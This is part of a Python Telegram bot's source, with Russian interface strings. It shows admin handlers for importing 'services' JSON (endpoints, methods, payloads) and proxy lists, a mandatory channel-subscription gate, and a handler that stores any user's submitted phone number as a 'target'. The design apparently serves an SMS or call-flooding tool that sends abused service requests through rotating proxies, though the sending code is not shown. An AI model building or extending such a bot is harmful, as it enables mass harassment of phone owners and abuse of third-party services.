        await message.answer("команда только для администраторов.")
        return

    status = "включена" if storage.op_enabled() else "выключена"
    ch_id = storage.op_channel_id() or "—"
    ch_url = storage.op_channel_url() or "—"
    users = storage.count_user_targets()

    await message.answer(
        "<b>Админ-панель</b>\n\n"
        f"ОП: <b>{status}</b>\n"
        f"ID канала: <code>{html.escape(ch_id)}</code>\n"
        f"Ссылка: {html.escape(ch_url)}\n"
        f"Пользователей с целью: <b>{users}</b>",
        reply_markup=admin_kb(storage),
    )


@router.callback_query(F.data.startswith("admin:"))
async def on_admin_callback(cb: CallbackQuery, state: FSMContext, storage: Storage) -> None:
    uid = cb.from_user.id
    if not is_admin(uid):
        await cb.answer("не для тебя", show_alert=True)
        return

    action = cb.data.split(":", 1)[1]

    if action == "toggle_op":
        enabled = storage.op_toggle()
        await cb.message.edit_reply_markup(reply_markup=admin_kb(storage))
        await cb.answer(f"ОП {'включена' if enabled else 'выключена'}")
        return

    if action == "set_channel_id":
        await state.set_state(AdminStates.waiting_channel_id)
        await cb.message.answer(
            "Отправь ID канала. Формат: <code>-1001234567890</code>.\n"
            "Бот должен быть админом канала."
        )
        await cb.answer()
        return

    if action == "set_channel_url":
        await state.set_state(AdminStates.waiting_channel_url)
        await cb.message.answer(
            "Отправь публичную ссылку. Формат: <code>https://t.me/your_channel</code>."
        )
        await cb.answer()
        return

    if action == "stats":
        await cb.answer()
        await cb.message.answer(
            f"services: {storage.count_services()}\n"
            f"proxies alive: {storage.count_proxies()}\n"
            f"пользователей с целью: {storage.count_user_targets()}"
        )
        return

    await cb.answer("неизвестное действие", show_alert=True)


@router.message(AdminStates.waiting_channel_id)
async def on_channel_id_input(message: Message, state: FSMContext, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    raw = (message.text or "").strip()
    if not re.match(r"^-?\d{6,}$", raw):
        await message.answer("это не похоже на ID канала. ожидаю число вроде -1001234567890.")
        return
    storage.set_meta("op_channel_id", raw)
    await state.clear()
    await message.answer(f"ID канала сохранён: <code>{html.escape(raw)}</code>")


@router.message(AdminStates.waiting_channel_url)
async def on_channel_url_input(message: Message, state: FSMContext, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    raw = (message.text or "").strip()
    if not re.match(r"^https?://t\.me/\S+$", raw):
        await message.answer("ожидаю ссылку вида https://t.me/your_channel")
        return
    storage.set_meta("op_channel_url", raw)
    await state.clear()
    await message.answer(f"ссылка сохранена: {html.escape(raw)}")


# ============================================================ import (admin)

def _looks_like_services_json(text: str) -> bool:
    """
    Эвристика: пользователь вставил JSON-объект или массив сервисов.
    Смотрим на ключевые поля без полного парсинга.
    """
    stripped = text.lstrip()
    if not (stripped.startswith("[") or stripped.startswith("{")):
        return False
    markers = ('"url"', '"endpoint"', '"services"', '"payload"', '"method"')
    return any(m in stripped for m in markers)


def _looks_like_proxy_list(text: str) -> bool:
    """
    Многострочный текст с двоеточиями и/или собаками, каждая строка похожа
    на запись прокси.
    """
    if "\n" not in text:
        return False
    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    if len(lines) < 2:
        return False
    hits = 0
    for ln in lines[:20]:
        if ":" in ln or "@" in ln:
            hits += 1
    return hits >= max(2, len(lines[:20]) // 2)


@router.message(F.document)
async def on_document(message: Message, bot: Bot, storage: Storage) -> None:
    uid = message.from_user.id
    if not is_admin(uid):
        await message.answer("импорт доступен только администраторам.")
        return

    doc = message.document
    if not doc:
        return
    name = (doc.file_name or "").lower()
    buf = io.BytesIO()
    await bot.download(doc, destination=buf)
    blob = buf.getvalue()

    if name.endswith(".json"):
        specs = parse_services_import(blob)
        if not specs:
            await message.answer("no services parsed from that json.")
            return
        added = storage.add_services(specs, source=f"file:{doc.file_name}")
        await message.answer(
            f"services imported: {added} new, {storage.count_services()} total."
        )
        return

    text = blob.decode("utf-8", errors="replace")
    entries = parse_proxy_blob(text)
    if not entries:
        await message.answer("no proxies parsed from that file.")
        return
    added = storage.add_proxies(entries)
    await message.answer(
        f"proxies imported: {added} new, {storage.count_proxies()} alive."
    )


# ---- админские команды по ресурсам ---------------------------------

@router.message(Command("proxies"))
async def cmd_proxies(message: Message, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    alive = storage.count_proxies()
    sample = storage.sample_proxies(limit=8)
    lines = [f"alive={alive}"]
    for p in sample:
        lines.append(f"  #{p.id}  {html.escape(p.raw[:60])}")
    await message.answer("\n".join(lines))


@router.message(Command("clear_proxies"))
async def cmd_clear_proxies(message: Message, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    storage.clear_proxies()
    await message.answer("proxy pool cleared.")


@router.message(Command("add_proxies"))
async def cmd_add_proxies(message: Message) -> None:
    if not is_admin(message.from_user.id):
        return
    await message.answer(
        "пришли .txt файлом или вставь строки в чат.\n"
        "форматы: ip:port | ip:port:user:pass | user:pass@ip:port | scheme://user:pass@ip:port"
    )


@router.message(Command("add_services"))
async def cmd_add_services(message: Message) -> None:
    if not is_admin(message.from_user.id):
        return
    await message.answer(
        "пришли .json файлом или вставь json в чат.\n"
        "форматы: [ {...}, ... ] | {\"services\": [...]} | один объект."
    )


@router.message(Command("services"))
async def cmd_services(message: Message, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    services = storage.list_services()
    if not services:
        await message.answer("no services loaded.")
        return
    by_source: dict[str, int] = {}
    for s in services:
        src = s.get("_source", "unknown")
        by_source[src] = by_source.get(src, 0) + 1
    lines = [f"total services: {len(services)}"]
    for src, n in sorted(by_source.items()):
        lines.append(f"  {html.escape(src)}: {n}")
    names = ", ".join(sorted({s["name"] for s in services})[:40])
    lines.append(f"names: {html.escape(names)}")
    await message.answer("\n".join(lines))


@router.message(Command("clear_services"))
async def cmd_clear_services(message: Message, storage: Storage) -> None:
    if not is_admin(message.from_user.id):
        return
    storage.clear_services()
    await message.answer("services pool cleared.")


# ============================================================ plain text

@router.message(F.text & ~F.text.startswith("/"))
async def on_plain_text(message: Message, bot: Bot, storage: Storage, state: FSMContext) -> None:
    uid = message.from_user.id
    text = (message.text or "").strip()
    if not text:
        return

    # 1) админ импортирует вставкой в чат — и это точно не номер
    if is_admin(uid) and "\n" in text:
        if _looks_like_services_json(text):
            specs = parse_services_import(text)
            if specs:
                added = storage.add_services(specs, source="paste")
                await message.answer(
                    f"services imported: {added} new, {storage.count_services()} total."
                )
                return
        if _looks_like_proxy_list(text):
            entries = parse_proxy_blob(text)
            if entries:
                added = storage.add_proxies(entries)
                await message.answer(
                    f"proxies imported: {added} new, {storage.count_proxies()} alive."
                )
                return

    # 2) номер телефона — авто-распознавание для всех
    digits = "".join(ch for ch in text if ch.isdigit())
    if 10 <= len(digits) <= 15:
        ok, url = await check_subscription(bot, uid)
        if not ok:
            await deny_unsubscribed(message, url)
            return
        full, _ = normalize_phone(text)
        storage.set_user_target(uid, text)
        await message.answer(
            f"🎯 Номер успешно распознан и установлен: <b>{html.escape(full)}</b>",
            reply_markup=after_target_kb(),
        )
        return

    await message.answer("не распознал. /start — список команд.")


# ============================================================ bootstrap

async def async_main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        stream=sys.stdout,
    )

    if not BOT_TOKEN:
        logging.error("BOT_TOKEN is not set")
        return 2
    if not ADMIN_IDS:
        logging.error("ADMIN_IDS is not set")
        return 2

    global _STORAGE
    storage = Storage(DB_PATH)
    _STORAGE = storage

    if storage.count_services() == 0 and SERVICES_FILE.exists():
        defaults = load_default_services(SERVICES_FILE)
        if defaults:
            added = storage.add_services(defaults, source="default")
            logging.info("seeded %d default services from %s", added, SERVICES_FILE)

    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    dp["storage"] = storage

    me = await bot.get_me()
    logging.info(
        "bot up as @%s, admins=%s, services=%d, proxies=%d, ОП=%s",
        me.username, sorted(ADMIN_IDS),
        storage.count_services(), storage.count_proxies(),
        "on" if storage.op_enabled() else "off",
    )

    stop_event = asyncio.Event()

    def _sig(*_: Any) -> None:
        stop_event.set()

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _sig)
        except NotImplementedError:
            pass

    polling = asyncio.create_task(
        dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    )
    stopper = asyncio.create_task(stop_event.wait())

    done, pending = await asyncio.wait(
        {polling, stopper}, return_when=asyncio.FIRST_COMPLETED
    )
    for task in pending:
        task.cancel()
    for task in pending:
        try:
            await task
        except (asyncio.CancelledError, Exception):
            pass

    await bot.session.close()
    return 0


def main() -> int:
    try:
        return asyncio.run(async_main())
    except (KeyboardInterrupt, SystemExit):
        return 0


if __name__ == "__main__":
    raise SystemExit(main())